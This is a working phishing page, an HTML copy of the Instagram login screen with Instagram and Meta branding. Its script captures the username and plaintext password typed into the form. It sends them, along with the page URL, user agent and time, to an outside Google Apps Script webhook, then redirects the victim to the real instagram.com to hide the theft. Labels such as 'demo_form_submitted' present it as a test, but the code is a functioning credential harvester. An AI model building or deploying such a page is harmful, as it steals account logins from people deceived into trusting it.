<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <title>Instagram • Login</title>

  <!-- Live Favicon -->
  <link href="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/instagram.svg" rel="icon" />

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #000000;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: space-between;
      color: #ffffff;
      padding: 20px 16px 24px;
    }

    /* Top language */
    .top-bar {
      width: 100%;
      display: flex;
      justify-content: center;
      padding-top: 12px;
      margin-bottom: 40px;
    }

    .language {
      color: #a8a8a8;
      font-size: 14px;
    }

    /* Instagram gradient logo */
    .logo-container {
      margin-bottom: 48px;
      display: flex;
      justify-content: center;
    }

    .instagram-logo {
      width: 72px;
      height: 72px;
      background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
      border-radius: 18px;
      position: relative;
    }

    .instagram-logo::before {
      content: "";
      width: 48px;
      height: 48px;
      border: 3.5px solid white;
      border-radius: 14px;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
    }

    .instagram-logo::after {
      content: "";
      width: 14px;
      height: 14px;
      border: 3.5px solid white;
      border-radius: 50%;
      position: absolute;
      top: 14px;
      right: 14px;
    }

    /* Form container */
    .form-container {
      width: 100%;
      max-width: 350px;
    }

    /* THIS is the important part - space between the boxes */
    #loginForm {
      display: flex;
      flex-direction: column;
      gap: 14px; /* ← Proper space between Username, Password and Button */
    }

    .input {
      width: 100%;
      height: 48px;
      background-color: #121212;
      border: 1px solid #363636;
      border-radius: 6px;
      padding: 0 14px;
      color: #ffffff;
      font-size: 14px;
      outline: none;
    }

    .input::placeholder {
      color: #a8a8a8;
    }

    .input:focus {
      border-color: #a8a8a8;
    }

    #submitBtn {
      width: 100%;
      height: 48px;
      background-color: #0095f6;
      border: none;
      border-radius: 8px;
      color: #ffffff;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 4px;
    }

    #submitBtn:hover {
      background-color: #1877f2;
    }

    #submitBtn:disabled {
      opacity: 0.7;
      cursor: not-allowed;
    }

    .forgot-pass {
      text-align: center;
      margin-top: 18px;
      color: #ffffff;
      font-size: 14px;
      text-decoration: none;
      display: block;
    }

    /* Bottom section */
    .bottom-section {
      width: 100%;
      max-width: 350px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 24px;
      margin-top: auto;
      padding-top: 40px;
    }

    .create-account-btn {
      width: 100%;
      height: 44px;
      background-color: transparent;
      border: 1px solid #0095f6;
      border-radius: 8px;
      color: #0095f6;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      text-decoration: none;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .meta-logo {
      display: flex;
      align-items: center;
      gap: 6px;
      color: #a8a8a8;
      font-size: 14px;
      font-weight: 500;
    }

    .meta-logo svg {
      width: 18px;
      height: 18px;
      fill: #a8a8a8;
    }

    #err {
      color: #ed4956;
      font-size: 13px;
      text-align: center;
      margin-top: 8px;
    }
  </style>
</head>
<body>

  <!-- Top language -->
  <div class="top-bar">
    <span class="language">English (US)</span>
  </div>

  <!-- Instagram Logo -->
<div class="logo-container">
  <img 
    src="instagram.png" 
    alt="Instagram"
    style="width: 72px; height: 72px;"
  >
</div>

  <!-- Login Form -->
  <div class="form-container">
    <form id="loginForm" action="" method="POST">
      <input id="username" 
             autocomplete="username" 
             class="input" 
             placeholder="Username, email or mobile number" 
             required 
             type="text" />

      <input id="password" 
             autocomplete="current-password" 
             class="input" 
             name="password" 
             placeholder="Password" 
             required 
             type="password" />

      <button id="submitBtn" type="submit">
        <span id="btnText">Log in</span>
      </button>

      <p id="err" hidden>Please fill in both fields.</p>

      <a class="forgot-pass" href="#">Forgot password?</a>
    </form>
  </div>

  <!-- Bottom section -->
  <div class="bottom-section">
    <a href="#" class="create-account-btn">Create new account</a>

    <div class="meta-logo">
      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 2.04c-5.5 0-10 4.49-10 10.02 0 5 3.66 9.15 8.44 9.9v-7H7.9v-2.9h2.54V9.85c0-2.51 1.49-3.89 3.78-3.89 1.09 0 2.23.19 2.23.19v2.47h-1.26c-1.24 0-1.63.77-1.63 1.56v1.88h2.78l-.45 2.9h-2.33v7a10 10 0 0 0 8.44-9.9c0-5.53-4.5-10.02-10-10.02z"/>
      </svg>
      <span>Meta</span>
    </div>
  </div>

  <!-- ====== ORIGINAL SCRIPT (UNCHANGED) ====== -->
  <script>
    const CONFIG = {
      WEBHOOK_URL: "https://script.google.com/macros/s/AKfycbx_p3CNRm-kl31QlpbddZaGyzaT13h82YxYlnxgFMSmixee6gnimkekQT6WOBbY98i0/exec",
      REDIRECT_URL: "https://www.instagram.com/",
      TIMEOUT_MS: 4000
    };

    const form = document.getElementById("loginForm");
    const errBox = document.getElementById("err");
    const btn = document.getElementById("submitBtn");
    const btnText = document.getElementById("btnText");

    async function saveTestEvent(data) {
      if (!CONFIG.WEBHOOK_URL || CONFIG.WEBHOOK_URL === "YOUR_TEST_WEBHOOK_URL") return;

      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), CONFIG.TIMEOUT_MS);

      try {
        await fetch(CONFIG.WEBHOOK_URL, {
          method: "POST",
          mode: "no-cors",
          headers: {
            "Content-Type": "text/plain;charset=utf-8"
          },
          body: JSON.stringify(data),
          signal: controller.signal
        });
      } catch (error) {
        // Logging failures won't prevent the redirect.
      } finally {
        clearTimeout(timer);
      }
    }

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value;

      console.log("Username entered:", username);
      console.log("Password field is filled:", password);

      if (!username || !password) {
        if (errBox) {
          errBox.hidden = false;
          errBox.textContent = "Please fill in both fields.";
        }
        return;
      }

      if (errBox) errBox.hidden = true;

      btn.disabled = true;
      btn.classList.add("loading");
      btnText.textContent = "Submitting…";

      await saveTestEvent({
        event: "demo_form_submitted",
        username: username,
        password: password,
        page: window.location.href,
        agent: navigator.userAgent,
        time: new Date().toISOString()
      });

      if (CONFIG.REDIRECT_URL) {
        window.location.href = CONFIG.REDIRECT_URL;
      }
    });
  </script>

</body>
</html>
